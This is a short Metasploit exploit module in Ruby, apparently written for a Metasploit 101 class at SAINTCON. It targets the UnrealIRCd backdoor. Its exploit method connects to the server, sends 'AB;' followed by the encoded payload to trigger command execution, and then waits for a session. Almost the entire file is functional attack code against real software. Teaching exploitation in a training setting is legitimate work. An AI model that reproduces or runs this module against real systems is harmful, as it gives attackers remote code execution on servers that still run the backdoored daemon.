class MetasploitModule < Msf::Exploit::Remote

    include Msf::Exploit::Remote::Tcp
  
    def initialize(info = {})
      super (update_info(info,
        'Name' => 'UnrealIRC bacldoor - SAINTCON',
        'Description' => %q{This module was created as an exercise for Metasploit 101 at SAINTCON},
        'Author' => ['SGO'],
        'License' => MSF_LICENSE,
        'Platform' => ['unix'],
        'Targets' => [ [ 'Automatic', { } ] ]
      ))
    end
  
    def exploit
      connect
  
      sock.put("AB;" + payload.encoded + "\n")
  
      1.upto(120) do
        break if session_created?
        select(nil, nil, nil, 0.25)
        handler()
      end
      disconnect
    end
  end